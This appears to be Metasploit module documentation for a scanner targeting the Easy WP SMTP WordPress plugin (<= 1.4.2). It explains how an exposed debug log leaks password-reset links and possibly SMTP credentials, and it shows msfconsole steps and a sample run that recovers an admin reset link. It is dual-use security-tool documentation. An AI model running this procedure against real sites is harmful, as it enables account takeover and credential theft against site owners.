## Vulnerable Application

Wordpress plugin Easy WP SMTP versions <= 1.4.2 was found to not include index.html within its plugin folder.
This potentially allows for directory listings.  If debug mode is also enabled for the plugin, all SMTP
commands are stored in a debug file.
Combining these items, it's possible to request a password reset for an account, then view the debug file to determine
the link that was emailed out, and reset the user's password.

This module will list ALL reset links, most likely the last one is the one that will work, however there
may be value in the others as well (such as other users).  The debug log saved in loot may also contain
the SMTP username and password.

To summarize:

1. Vulnerable version of Easy WP SMTP
1. debug turned on for Easy WP SMTP
1. SMTP configured for Easy WP SMTP
1. direcotry listings enabled

### Install

1. Install wordpress
1. Download and install [Easy WP SMTP](https://wordpress.org/plugins/easy-wp-smtp/advanced/) <= 1.4.2
1. Browse to Settings > Easy WP SMTP
    1. Configure the plugin (SMTP Host, SMTP Port, UN/PASS)
    1. Additional Settings > Enable Debug Log (Check this value, click Save Changes)

## Verification Steps

1. Install Wordpress, Easy WP SMTP, and configure it
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/wp_easy_wp_smtp`
1. Do: `set rhost [ip]`
1. Do: `set USER [username]`
1. Do: `run`
1. You should get the link to reset the user's password

## Options

### User

The username to reset the password of

## Scenarios

### Easy WP SMTP 1.4.1 on Wordpress 5.4.4 running on Ubuntu 20.04

```
esource (wp_easy_wp_smtp.rb)> use auxiliary/scanner/http/wp_easy_wp_smtp
resource (wp_easy_wp_smtp.rb)> set verbose true
verbose => true
resource (wp_easy_wp_smtp.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (wp_easy_wp_smtp.rb)> run
[*] Checking /wp-content/plugins/easy-wp-smtp/readme.txt
[*] Found version 1.4.1 in the plugin
[+] Vulnerable version detected
[+] Found debug log: /wp-content/plugins/easy-wp-smtp/5fcfd49e879f9_debug_log.txt
[*] Sending password reset for Admin
[+] Debug log saved to /home/h00die/.msf4/loot/20201208204705_default_1.1.1.1_5fcfd49e879f9_de_209239.txt.  Manual review for possible SMTP password, and other information.
[*] admin password reset: http://1.1.1.1/wp-login.php?action=rp&key=IdlSwWkIuy0f7k79OU2p&login=admin
[*] Finished enumerating resets.  Last one most likely to succeed
[*] Scanned 1 of 1 hosts (100% complete)
```
